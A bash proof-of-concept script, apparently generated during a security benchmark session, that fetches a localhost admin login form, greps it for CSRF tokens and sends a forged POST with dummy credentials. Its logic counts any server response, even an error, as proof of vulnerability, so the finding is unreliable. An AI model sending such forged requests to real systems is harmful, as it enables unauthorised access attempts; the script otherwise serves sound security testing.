#!/bin/bash
# POC: Demonstrates missing CSRF protection on admin login form. Shows that the form lacks CSRF tokens and can be exploited via forged requests.
# Target: ./repo
# Created: 2025-11-10T18:27:22.460Z
# Session: benchmark-XBEN-078-24-mhtgyxl3

# CSRF Protection Proof-of-Concept for Admin Login
# Demonstrates missing CSRF token protection on admin.php

TARGET="http://localhost:32768"
ADMIN_ENDPOINT="$TARGET/admin.php"

echo "=== CSRF Vulnerability POC: Admin Login Form ==="
echo ""
echo "[*] Step 1: Fetching admin login form to check for CSRF tokens..."
echo ""

# Fetch the admin form and analyze it
FORM_RESPONSE=$(curl -s "$ADMIN_ENDPOINT")

echo "Form HTML Response:"
echo "$FORM_RESPONSE"
echo ""
echo "---"
echo ""

# Check for common CSRF protection mechanisms
echo "[*] Step 2: Checking for CSRF protection mechanisms..."
echo ""

# Check for CSRF token field
if echo "$FORM_RESPONSE" | grep -qi "csrf"; then
    echo "[✓] CSRF token field found"
    CSRF_FOUND=1
else
    echo "[✗] No CSRF token field found"
    CSRF_FOUND=0
fi

# Check for nonce
if echo "$FORM_RESPONSE" | grep -qi "nonce"; then
    echo "[✓] Nonce field found"
    NONCE_FOUND=1
else
    echo "[✗] No nonce field found"
    NONCE_FOUND=0
fi

# Check for token field
if echo "$FORM_RESPONSE" | grep -qi "_token"; then
    echo "[✓] Token field found"
    TOKEN_FOUND=1
else
    echo "[✗] No token field found"
    TOKEN_FOUND=0
fi

# Check for form method
if echo "$FORM_RESPONSE" | grep -qi "method=\"POST\""; then
    echo "[✓] Form uses POST method"
else
    echo "[!] Form does not use POST method"
fi

echo ""
echo "---"
echo ""

# If no CSRF protections found, demonstrate the vulnerability
if [ $CSRF_FOUND -eq 0 ] && [ $NONCE_FOUND -eq 0 ] && [ $TOKEN_FOUND -eq 0 ]; then
    echo "[!] VULNERABILITY CONFIRMED: No CSRF protection mechanisms detected!"
    echo ""
    echo "[*] Step 3: Attempting forged login request (CSRF attack)..."
    echo ""
    
    # Attempt a forged request without any CSRF token
    ATTACK_RESPONSE=$(curl -s -X POST "$ADMIN_ENDPOINT" \
        -d "username=attacker&password=forged" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    echo "Server Response to Forged Request:"
    echo "$ATTACK_RESPONSE" | head -20
    echo ""
    
    # Check if the request was processed (vulnerable)
    if echo "$ATTACK_RESPONSE" | grep -qi "error\|invalid\|failed"; then
        echo "[!] Request processed by server (vulnerable to CSRF)"
        exit 0
    elif [ -n "$ATTACK_RESPONSE" ]; then
        echo "[!] Server accepted request without CSRF validation (vulnerable to CSRF)"
        exit 0
    fi
else
    echo "[✓] CSRF protection mechanisms detected - system appears protected"
    exit 1
fi